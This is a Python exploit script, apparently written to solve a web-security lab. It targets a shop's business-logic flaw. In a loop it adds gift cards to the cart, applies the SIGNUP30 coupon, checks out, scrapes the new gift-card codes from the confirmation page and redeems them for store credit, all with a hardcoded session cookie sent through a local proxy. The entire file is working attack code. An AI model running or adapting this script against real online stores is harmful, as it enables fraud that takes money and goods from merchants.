import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def logic_flow(url):
	for i in range(1,10):
		print("loop %s" % i)
		path = '/cart'
		data = {"productId":2, "redir":"CART", "quantity":40}
		cookies = {"session":"JGqZ4bxOCBMt3Th197yQmMbGQFsIMLNK"}
		r = requests.post(url + path, verify=False, proxies=proxies, cookies=cookies, data=data)
		res = r.text
		soup = BeautifulSoup(res, 'html.parser')
		csrf = soup.find('input',{"name":"csrf"})["value"]
		
		path = '/cart/coupon'
		data = {"csrf":csrf, "coupon":"SIGNUP30"}
		cookies = {"session":"JGqZ4bxOCBMt3Th197yQmMbGQFsIMLNK"}
		r = requests.post(url + path, verify=False, proxies=proxies, cookies=cookies, data=data)
		
		path = '/cart/checkout'
		data = {"csrf":csrf}
		cookies = {"session":"JGqZ4bxOCBMt3Th197yQmMbGQFsIMLNK"}
		r = requests.post(url + path, verify=False, proxies=proxies, cookies=cookies, data=data)
		res = r.text
		soup = BeautifulSoup(res, 'html.parser')
		table = soup.find('table',{"class":"is-table-numbers"})
		coupons = table.findAll('td')
		path = '/gift-card'
		for coupon in coupons:
			data = {"csrf":csrf, "gift-card":coupon}
			cookies = {"session":"JGqZ4bxOCBMt3Th197yQmMbGQFsIMLNK"}
			r = requests.post(url + path, verify=False, proxies=proxies, cookies=cookies, data=data)
			res = r.text
			soup = BeautifulSoup(res, 'html.parser')
			credit = soup.find('strong')
			print(credit)

	
		
if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print("[-] Usage: %s <url>" % sys.argv[0])
		print("[-] Example: %s www.example.com" % sys.argv[0])
		sys.exit(-1)
		
	print("[+] Adding quantity")
	logic_flow(url)
